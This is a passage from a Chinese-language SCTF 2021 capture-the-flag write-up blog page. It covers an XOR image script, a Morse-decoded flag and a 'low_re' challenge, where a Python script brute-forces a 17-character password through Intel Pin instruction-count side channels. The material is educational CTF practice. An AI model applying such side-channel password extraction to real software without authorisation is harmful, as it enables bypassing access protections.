        r1, g1, b1 <span style="color:#f92672">=</span> a[j]
        r2, g2, b2 <span style="color:#f92672">=</span> b[j]
        r3, g3, b3 <span style="color:#f92672">=</span> c[j]
        r4, g4, b4 <span style="color:#f92672">=</span> d[j]
        
        r0 <span style="color:#f92672">=</span> r2 <span style="color:#f92672">^</span> r1 <span style="color:#f92672">^</span> r3 <span style="color:#f92672">^</span> r4
        g0 <span style="color:#f92672">=</span> g2 <span style="color:#f92672">^</span> g1 <span style="color:#f92672">^</span> g3 <span style="color:#f92672">^</span> g4
        b0 <span style="color:#f92672">=</span> b2 <span style="color:#f92672">^</span> b1 <span style="color:#f92672">^</span> b3 <span style="color:#f92672">^</span> b4
        <span style="color:#66d9ef">if</span> r0 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
            r0, b0, g0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">255</span>
        <span style="color:#75715e">#     # c0 = chr(ord(c1) ^ ord(c2))</span>
        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[38;2;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">m▇&#39;</span> <span style="color:#f92672">%</span> (r0, g0, b0)
        fp<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> payload<span style="color:#f92672">.</span>encode())
    fp<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
</code></pre></div><h3 id="in_the_vaporwaves">in_the_vaporwaves</h3>
<p>用国赛的华为音响播放（应该是个非预期）直接听到了莫斯码，录音下来的结果</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 208; 
			flex-basis: 500px"
	>
	<a href="/post/sctf2021-writeup-by-or4nge/in_the_vaporwaves_1.jpg" data-size="1546x742">
		<img src="/post/sctf2021-writeup-by-or4nge/in_the_vaporwaves_1.jpg"
			width="1546"
			height="742"
			srcset="/post/sctf2021-writeup-by-or4nge/in_the_vaporwaves_1_hu6f8c045420ef5d32ea15d1d2957ec515_60648_480x0_resize_q75_box.jpg 480w, /post/sctf2021-writeup-by-or4nge/in_the_vaporwaves_1_hu6f8c045420ef5d32ea15d1d2957ec515_60648_1024x0_resize_q75_box.jpg 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>摩斯码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">.../-.-./-/..-./-.././.../.----/.-./...--/..--.-/-../.-./../...-/./.../..--.-/../-./-/-----/..--.-/...-/.-/.--./---/.-./.--/.--.-./...-/./...
</code></pre></div><p>解莫斯码得到flag</p>
<h3 id="low_re">low_re</h3>
<p>vmp 壳，根据题目描述，应该无法逆向出正确的逻辑，什么信息都没有的情况下想到用 pintools 来试试，手动尝试发现长度是 17 位，并且指令数量差异很明显</p>
<p>按位爆破：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> subprocess
<span style="color:#f92672">import</span> string

password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;S1deCh4nnelAtt@ck&#34;</span>
cur <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span>

charset <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>punctuation

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> charset:
    command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;echo &#34;</span> <span style="color:#f92672">+</span> password[:cur] <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> password[cur <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>:] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; | ./pin.exe -t source/tools/ManualExamples/obj-intel64/inscount0.dll -- ./low_re.exe; cat inscount.out&#34;</span>
    output <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output(command, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
    print (password[:cur] <span style="color:#f92672">+</span> i, output)
</code></pre></div><p>指令数量差异很明显，可以直接猜测单词加快速度</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 376; 
			flex-basis: 904px"
	>
	<a href="/post/sctf2021-writeup-by-or4nge/low_re_1.png" data-size="931x247">
		<img src="/post/sctf2021-writeup-by-or4nge/low_re_1.png"
			width="931"
			height="247"
			srcset="/post/sctf2021-writeup-by-or4nge/low_re_1_hu0b0cf92681f69173361820ee840bf241_46553_480x0_resize_box_3.png 480w, /post/sctf2021-writeup-by-or4nge/low_re_1_hu0b0cf92681f69173361820ee840bf241_46553_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/writeup/">Writeup</a>
        
            <a href="/tags/sctf/">SCTF</a>
        
            <a href="/tags/xctf/">XCTF</a>
        
    </section>


    </footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
                defer="true"
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ]
        });})
</script>
    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/post/kctf2021-fall-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/kctf2021-fall-writeup-by-or4nge/cover.d3f800bd94671a07795ef31abe675705_hufd6827b5e92508a15177056d76ff05d4_2462797_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-0/gAvZRnGgd5XvMavmdXBQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">KCTF2021 Fall Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/dnuictf-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams.a2ec5f685d98dbff218d75d526fbc61d_hu9bd851d71a6520395d404c81ac536fbe_87588_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-ouxfaF2Y2/8hjXXVJvvGHQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">2021暗泉杯 Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/bluehat-final-writeup/">
        
        

        <div class="article-details">
            <h2 class="article-title">2021蓝帽杯决赛 Writeup</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2022 or4nge
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#loginme">loginme</a></li>
        <li><a href="#upload_it">Upload_it</a></li>
        <li><a href="#fumo_on_the_christmas_tree">FUMO_on_the_Christmas_tree</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#dataleak">dataleak</a></li>
      </ul>
    </li>
    <li><a href="#re">Re</a>
      <ul>
        <li><a href="#godness-dance">godness dance</a></li>
        <li><a href="#cplusexceptionencrypt">CPlusExceptionEncrypt</a></li>
        <li><a href="#sycos">SycOS</a></li>
        <li><a href="#sycgame">SycGame</a></li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#ciruit-map">ciruit map</a></li>
      </ul>
    </li>
    <li><a href="#misc">Misc</a>
      <ul>
        <li><a href="#this_is_a_tree">This_is_A_tree</a></li>
        <li><a href="#fumo_xor_cli">fumo_xor_cli</a></li>
        <li><a href="#in_the_vaporwaves">in_the_vaporwaves</a></li>
        <li><a href="#low_re">low_re</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
